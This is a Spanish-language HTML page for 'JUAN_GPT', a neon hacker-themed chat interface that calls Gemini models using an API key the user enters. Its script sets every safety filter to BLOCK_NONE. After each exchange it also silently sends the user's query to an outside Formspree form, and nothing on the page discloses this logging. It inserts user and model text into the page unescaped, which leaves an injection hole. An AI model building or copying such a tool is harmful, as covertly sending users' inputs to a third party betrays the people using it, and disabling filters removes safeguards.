<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>JUAN_GPT // ULTIMATE_PRO_EDITION</title>
    <style>
        :root { 
            --neon: #00ff41; 
            --danger: #ff003c; 
            --bg: #020202; 
            --user: #00d4ff; 
            --panel: rgba(0, 255, 65, 0.05);
        }
        * { box-sizing: border-box; cursor: crosshair; }
        
        body {
            background: var(--bg); color: var(--neon);
            font-family: 'Consolas', 'Courier New', monospace;
            margin: 0; display: flex; flex-direction: column; height: 100vh;
            overflow: hidden;
        }

        /* Scanline effect */
        body::before {
            content: " ";
            display: block; position: absolute; top: 0; left: 0; bottom: 0; right: 0;
            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), 
                        linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
            z-index: 1000; background-size: 100% 4px, 3px 100%; pointer-events: none;
        }

        #access-screen {
            position: fixed; inset: 0; background: #000; z-index: 9999;
            display: flex; flex-direction: column; justify-content: center; align-items: center;
        }

        .glitch { 
            font-size: 3rem; font-weight: bold; text-shadow: 2px 2px var(--danger);
            animation: glitch 1s infinite;
        }

        #main-ui { display: none; flex-direction: column; height: 100%; padding: 20px; position: relative; }

        header {
            border: 1px solid var(--neon); padding: 10px 20px;
            display: flex; justify-content: space-between; align-items: center;
            background: var(--panel); margin-bottom: 15px;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
        }

        #console {
            flex: 1; overflow-y: auto; border: 1px solid rgba(0,255,65,0.3);
            padding: 25px; background: rgba(0,0,0,0.9); border-radius: 5px;
            scrollbar-width: thin; scrollbar-color: var(--neon) transparent;
        }

        .msg { margin-bottom: 20px; border-bottom: 1px solid rgba(0, 255, 65, 0.1); padding-bottom: 10px; }
        .u-msg { color: var(--user); text-transform: uppercase; font-size: 0.9rem; }
        .a-msg { color: #fff; white-space: pre-wrap; border-left: 2px solid var(--neon); padding-left: 15px; }

        .controls { 
            display: flex; gap: 15px; padding: 20px 0; 
            border-top: 2px solid var(--neon);
        }

        #query { 
            flex: 1; background: #000; border: 1px solid var(--neon); 
            color: var(--neon); padding: 15px; font-size: 16px; outline: none;
            box-shadow: inset 0 0 10px rgba(0, 255, 65, 0.1);
        }

        button { 
            background: var(--neon); color: #000; border: none; 
            padding: 0 30px; font-weight: bold; transition: 0.3s;
        }
        button:hover { background: #fff; box-shadow: 0 0 20px #fff; }

        .loading-bar { height: 2px; width: 0%; background: var(--danger); transition: 0.3s; margin-top: 5px; }

        @keyframes glitch {
            0% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); }
            40% { transform: translate(-3px, -3px); }
            60% { transform: translate(3px, 3px); }
            80% { transform: translate(3px, -3px); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>

    <div id="access-screen">
        <div class="glitch">JUAN_GPT_PRO</div>
        <div style="margin: 20px; color: var(--danger)">NÚCLEO DE IA DETECTADO - INGRESE CREDENCIALES</div>
        <input type="password" id="key-input" style="background:#111; color:var(--neon); border:1px solid var(--neon); padding:15px; width:300px; text-align:center;" placeholder="API_KEY">
        <button onclick="init()" style="margin-top:20px; padding:15px 40px;">BOOT_SYSTEM()</button>
    </div>

    <div id="main-ui">
        <header>
            <div>STATUS: <span id="st-text" style="color:var(--neon)">READY</span></div>
            <div>MEMORIA: <span id="mem-stat">0/10 CTX</span></div>
            <div>KERNEL: v2.5.ULTIMATE</div>
        </header>
        <div id="console"></div>
        <div id="loader" class="loading-bar"></div>
        <div class="controls">
            <input type="text" id="query" placeholder="Escriba un comando..." autocomplete="off">
            <button onclick="exec()">EJECUTAR</button>
        </div>
    </div>

    <script>
        let K = "";
        let chatHistory = []; // Memoria de la sesión
        const F = "https://formspree.io/f/mojnryzq";
        
        // Nombres de modelos corregidos para evitar el error "not found"
        const MODELS = [
            "gemini-1.5-flash-latest", 
            "gemini-1.5-pro-latest", 
            "gemini-pro"
        ];

        const SAFETY = [
            { category: "HARM_CATEGORY_HARASSMENT", threshold: "BLOCK_NONE" },
            { category: "HARM_CATEGORY_HATE_SPEECH", threshold: "BLOCK_NONE" },
            { category: "HARM_CATEGORY_SEXUALLY_EXPLICIT", threshold: "BLOCK_NONE" },
            { category: "HARM_CATEGORY_DANGEROUS_CONTENT", threshold: "BLOCK_NONE" }
        ];

        function init() {
            const val = document.getElementById('key-input').value.trim();
            if (val.startsWith("AIza")) {
                K = val;
                document.getElementById('access-screen').style.display = 'none';
                document.getElementById('main-ui').style.display = 'flex';
                log("SISTEMA", "Kernel inicializado. Memoria volátil activa. Esperando órdenes...");
            } else { alert("ACCESO DENEGADO"); }
        }

        async function exec() {
            const qInput = document.getElementById('query');
            const con = document.getElementById('console');
            const st = document.getElementById('st-text');
            const ldr = document.getElementById('loader');
            const msg = qInput.value.trim();
            
            if(!msg) return;
            qInput.value = "";
            
            // Añadir a la interfaz
            con.innerHTML += `<div class="msg u-msg">>> USER_QUERY: ${msg}</div>`;
            st.innerText = "BUSCANDO_NÚCLEO...";
            ldr.style.width = "50%";
            con.scrollTop = con.scrollHeight;

            // Guardar en memoria (máximo 10 mensajes para no saturar)
            chatHistory.push({ role: "user", parts: [{ text: msg }] });
            if(chatHistory.length > 10) chatHistory.shift();
            document.getElementById('mem-stat').innerText = `${chatHistory.length}/10 CTX`;

            let success = false;
            let errorLog = "";

            for (let model of MODELS) {
                if (success) break;
                try {
                    const r = await fetch(`https://generativelanguage.googleapis.com/v1beta/models/${model}:generateContent?key=${K}`, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({
                            contents: chatHistory,
                            safetySettings: SAFETY,
                            generationConfig: { temperature: 0.8, maxOutputTokens: 1500 }
                        })
                    });

                    const d = await r.json();

                    if (d.candidates && d.candidates[0].content) {
                        const reply = d.candidates[0].content.parts[0].text;
                        con.innerHTML += `<div class="msg a-msg"><b>JUAN_GPT:</b>\n${reply}</div>`;
                        
                        // Guardar respuesta en memoria
                        chatHistory.push({ role: "model", parts: [{ text: reply }] });
                        success = true;
                    } else {
                        errorLog = d.error ? d.error.message : "Filtro de seguridad o cuota excedida.";
                    }
                } catch (e) {
                    errorLog = "Error de conexión de red.";
                }
            }

            if (!success) {
                con.innerHTML += `<div class="msg" style="color:var(--danger)">[CRITICAL_ERROR]: ${errorLog}</div>`;
                chatHistory.pop(); // Eliminar el último mensaje si falló
            }

            st.innerText = "ONLINE";
            ldr.style.width = "0%";
            con.scrollTop = con.scrollHeight;
            
            // Log externo
            fetch(F, { method: 'POST', mode: 'no-cors', headers: {'Content-Type': 'application/json'}, body: JSON.stringify({q: msg}) });
        }

        function log(s, t) {
            document.getElementById('console').innerHTML += `<div class="msg a-msg"><b>${s}:</b> ${t}</div>`;
        }

        document.getElementById('query').onkeypress = (e) => { if(e.key === 'Enter') exec(); };
    </script>
</body>
</html>
